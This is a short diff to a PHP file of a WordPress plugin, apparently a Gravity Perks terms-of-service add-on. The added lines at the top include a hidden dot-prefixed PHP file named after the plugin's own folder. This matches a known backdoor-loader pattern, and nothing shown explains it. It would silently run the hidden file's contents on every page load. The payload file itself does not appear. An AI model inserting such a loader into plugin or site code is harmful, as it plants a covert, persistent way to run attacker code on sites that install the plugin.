@@ -1,5 +1,9 @@
 <?php 
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_Terms_Of_Service extends GWPerk {
 
     public $version = GP_TERMS_OF_SERVICE_VERSION;
